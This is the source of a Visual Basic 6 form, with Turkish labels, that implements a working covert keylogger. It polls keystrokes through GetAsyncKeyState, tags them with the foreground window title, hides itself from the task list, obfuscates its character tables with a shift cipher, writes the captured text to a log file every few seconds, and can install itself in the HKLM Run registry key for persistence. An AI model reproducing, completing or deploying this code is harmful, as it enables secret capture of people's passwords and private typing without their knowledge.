VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   ClientHeight    =   3195
   ClientLeft      =   60
   ClientTop       =   435
   ClientWidth     =   8100
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   8100
   Begin VB.Frame Frame5 
      BackColor       =   &H00000000&
      Caption         =   "[ Ayarlar ]"
      ForeColor       =   &H8000000D&
      Height          =   615
      Left            =   4680
      TabIndex        =   4
      Top             =   2520
      Width           =   3375
      Begin VB.CheckBox Check1 
         BackColor       =   &H00000000&
         Caption         =   "Baþlangýç ekle"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   1680
         TabIndex        =   7
         Top             =   240
         Width           =   1575
      End
      Begin VB.TextBox Text4 
         Alignment       =   2  'Center
         Enabled         =   0   'False
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   960
         MaxLength       =   1
         TabIndex        =   6
         Top             =   240
         Width           =   735
      End
      Begin VB.Label Label3 
         BackColor       =   &H00000000&
         Caption         =   "Baþlangýç :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   240
         Width           =   855
      End
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00000000&
      Caption         =   "[ Kayýtlar ]"
      ForeColor       =   &H8000000D&
      Height          =   2535
      Left            =   0
      TabIndex        =   2
      Top             =   0
      Width           =   8055
      Begin VB.TextBox kyt01 
         Height          =   2175
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   3
         Top             =   240
         Width           =   7815
      End
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00000000&
      Caption         =   "[ Kayýt Yol ]"
      ForeColor       =   &H8000000D&
      Height          =   615
      Left            =   0
      TabIndex        =   0
      Top             =   2520
      Width           =   4575
      Begin VB.TextBox kytyl01 
         Enabled         =   0   'False
         Height          =   285
         Left            =   960
         TabIndex        =   1
         Top             =   240
         Width           =   3495
      End
      Begin VB.Label Label8 
         BackColor       =   &H00000000&
         Caption         =   "Log Yol :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   8
         Top             =   240
         Width           =   975
      End
   End
   Begin VB.Timer zmn01 
      Interval        =   5
      Left            =   7560
      Top             =   3240
   End
   Begin VB.Timer zmn02 
      Interval        =   5000
      Left            =   7080
      Top             =   3240
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'---------------[ API ]---------------
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long

Private LastWindow As String
Private LastHandle As Long
Private dKey(255) As Long
Private Const VK_SHIFT = &H10
Private Const VK_CTRL = &H11
Private Const VK_ALT = &H12
Private Const VK_CAPITAL = &H14
Private ChangeChr(255) As String
Private AltDown As Boolean

Private Sub Check1_Click()
If Check1.Value = Text4.Text Then
Dim KayitDefteri As Object
Dim reg As Object
Set KayitDefteri = CreateObject("wscript.shell")
KayitDefteri.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & App.EXEName, App.Path & "\" & App.EXEName & ".exe"
Else
Set reg = CreateObject("wscript.shell")
reg.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & App.EXEName
End If
End Sub




Private Sub Form_Load()
On Error Resume Next
ChangeChr(33) = DecryptText(("œ‘¢¨¦–±ž"), "a")
ChangeChr(34) = DecryptText(("œ‘¢¨¦…°¸¯ž"), "a")
ChangeChr(35) = DecryptText(("œ†¯¥žž"), "a")
ChangeChr(36) = DecryptText(("œ‰°®¦ž"), "a")

ChangeChr(45) = DecryptText(("œŠ¯´¦³µž"), "a")
ChangeChr(46) = DecryptText(("œ…¦­¦µ¦ž"), "a")

ChangeChr(48) = DecryptText(("~"), "a")
ChangeChr(49) = DecryptText(("b"), "a")
ChangeChr(50) = DecryptText(("h"), "a")
ChangeChr(51) = DecryptText(("Ÿ"), "a")
ChangeChr(52) = DecryptText(("l"), "a")
ChangeChr(53) = DecryptText(("f"), "a")
ChangeChr(54) = DecryptText(("g"), "a")
ChangeChr(55) = DecryptText(("p"), "a")
ChangeChr(56) = DecryptText(("i"), "a")
ChangeChr(57) = DecryptText(("j"), "a")

ChangeChr(186) = DecryptText(("?"), "a")
ChangeChr(187) = DecryptText(("~"), "a")
ChangeChr(188) = DecryptText(("m"), "a")
ChangeChr(189) = DecryptText(("n"), "a")
ChangeChr(190) = DecryptText(("o"), "a")
ChangeChr(191) = DecryptText(("7"), "a")

ChangeChr(219) = "ð"
ChangeChr(220) = "ç"
ChangeChr(221) = "ü"
ChangeChr(222) = "i"


ChangeChr(86) = "Þ"
ChangeChr(87) = DecryptText(("`l"), "a")
ChangeChr(88) = DecryptText(("|"), "a")
ChangeChr(89) = DecryptText(("â¡"), "b")
ChangeChr(90) = DecryptText(("{"), "a")
ChangeChr(91) = DecryptText(("€"), "a")

ChangeChr(119) = "Ð"
ChangeChr(120) = "Ç"
ChangeChr(121) = "Ü"
ChangeChr(122) = "Ý"


ChangeChr(96) = DecryptText(("_q"), "a")
ChangeChr(97) = DecryptText(("r"), "a")
ChangeChr(98) = DecryptText(("s"), "a")
ChangeChr(99) = DecryptText(("t"), "a")
ChangeChr(100) = DecryptText(("u"), "a")
ChangeChr(101) = DecryptText(("v"), "a")
ChangeChr(102) = DecryptText(("w"), "a")
ChangeChr(103) = DecryptText(("x"), "a")
ChangeChr(104) = DecryptText(("y"), "a")
ChangeChr(105) = DecryptText(("z"), "a")
ChangeChr(106) = DecryptText(("k"), "a")
ChangeChr(107) = DecryptText(("l"), "a")
ChangeChr(109) = DecryptText(("n"), "a")
ChangeChr(110) = DecryptText(("o"), "a")
ChangeChr(111) = DecryptText(("p"), "a")

ChangeChr(192) = DecryptText(("cc"), "a")
ChangeChr(92) = DecryptText(("*"), "a")

App.TaskVisible = False

'---------------[ Ayarlar ]---------------
On Error Resume Next
Dim PropBag As PropertyBag
Set PropBag = New PropertyBag
Set PropBag = LoadCompiledData
If PropBag.ReadProperty("error", "") = "true" Then
MsgBox "_DangerOusMaN_"
'End
End If
'------------------------------{AYARLAR}------------------------------
kytyl01.Text = PropBag.ReadProperty("LogYolu", "")
Text4.Text = PropBag.ReadProperty("Baslangýc", "")
'============================================
Check1.Value = Text4.Text
End Sub


'---------------[ zmn01 ]---------------
Private Sub zmn01_Timer()

'a-z A-Z
For i = Asc("A") To Asc("Z")
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_SHIFT) < 0 Then
If GetKeyState(VK_CAPITAL) > 0 Then
kyt01 = kyt01 & LCase(Chr(i))
Exit Sub
Else
kyt01 = kyt01 & UCase(Chr(i))
Exit Sub
End If
Else
If GetKeyState(VK_CAPITAL) > 0 Then
kyt01 = kyt01 & UCase(Chr(i))
Exit Sub
Else
kyt01 = kyt01 & LCase(Chr(i))
Exit Sub
End If
End If

End If
Next

'1234567890)(*&^%$#@!
For i = 48 To 57
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_SHIFT) < 0 Then
kyt01 = kyt01 & ChangeChr(i)
Exit Sub
Else
kyt01 = kyt01 & Chr(i)
Exit Sub
End If

End If
Next


';=,-./
For i = 186 To 192
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_SHIFT) < 0 Then
kyt01 = kyt01 & ChangeChr(i - 100)
Exit Sub
Else
kyt01 = kyt01 & ChangeChr(i)
Exit Sub
End If

End If
Next




'num pad
For i = 96 To 111
If GetAsyncKeyState(i) = -32767 Then
TypeWindow

If GetAsyncKeyState(VK_ALT) < 0 And AltDown = False Then
AltDown = True
kyt01 = kyt01 & ""
Else
If GetAsyncKeyState(VK_ALT) >= 0 And AltDown = True Then
AltDown = False
kyt01 = kyt01 & ""
End If
End If

kyt01 = kyt01 & ChangeChr(i)
Exit Sub
End If
Next

'for space
If GetAsyncKeyState(32) = -32767 Then
TypeWindow
kyt01 = kyt01 & " "
End If

'for enter
If GetAsyncKeyState(13) = -32767 Then
TypeWindow
kyt01 = kyt01 & vbCrLf
End If

'for backspace
If GetAsyncKeyState(8) = -32767 Then
TypeWindow
kyt01 = kyt01 & "[SÝL]"
End If


'tab
If GetAsyncKeyState(9) = -32767 Then
TypeWindow
kyt01 = kyt01 & " [Tab] "
End If

'insert, delete
For i = 45 To 46
If GetAsyncKeyState(i) = -32767 Then
TypeWindow
kyt01 = kyt01 & ChangeChr(i)
End If
Next



'left click
If GetAsyncKeyState(1) = -32767 Then
If (LastHandle = GetForegroundWindow) And LastHandle <> 0 Then
kyt01 = kyt01 & " "
End If
End If
End Sub
'---------------[ zmn02 ]---------------
Private Sub zmn02_Timer()
On Error Resume Next
kytyl01.Text = kytyl02.Text
Open kytyl01.Text For Output As #1
Print #1, kyt01.Text;
Close #1
End Sub
'---------------[ TypeWindow ]---------------
Function TypeWindow()
Dim Handle As Long
Dim textlen As Long
Dim WindowText As String
Handle = GetForegroundWindow
LastHandle = Handle
textlen = GetWindowTextLength(Handle) + 1
WindowText = Space(textlen)
svar = GetWindowText(Handle, WindowText, textlen)
WindowText = Left(WindowText, Len(WindowText) - 1)
If WindowText <> LastWindow Then
If kyt01 <> "" Then kyt01 = kyt01 & vbCrLf & vbCrLf
kyt01 = kyt01 & "===========[ " & WindowText & " ]===========" & vbCrLf
LastWindow = WindowText
End If
End Function

Private Function EncryptText(strText As String, ByVal strPwd As String)
Dim i As Integer, c As Integer
Dim strBuff As String

#If Not CASE_SENSITIVE_PASSWORD Then
strPwd = UCase$(strPwd)
#End If
If Len(strPwd) Then
For i = 1 To Len(strText)
c = Asc(Mid$(strText, i, 1))
c = c + Asc(Mid$(strPwd, (i Mod Len(strPwd)) + 1, 1))
strBuff = strBuff & Chr$(c And &HFF)
Next i
Else
strBuff = strText
End If
EncryptText = strBuff
End Function
Private Function DecryptText(strText As String, ByVal strPwd As String)
Dim i As Integer, c As Integer
Dim strBuff As String
#If Not CASE_SENSITIVE_PASSWORD Then
strPwd = UCase$(strPwd)
#End If
If Len(strPwd) Then
For i = 1 To Len(strText)
c = Asc(Mid$(strText, i, 1))
c = c - Asc(Mid$(strPwd, (i Mod Len(strPwd)) + 1, 1))
strBuff = strBuff & Chr$(c And &HFF)
Next i
Else
strBuff = strText
End If
DecryptText = strBuff
End Function

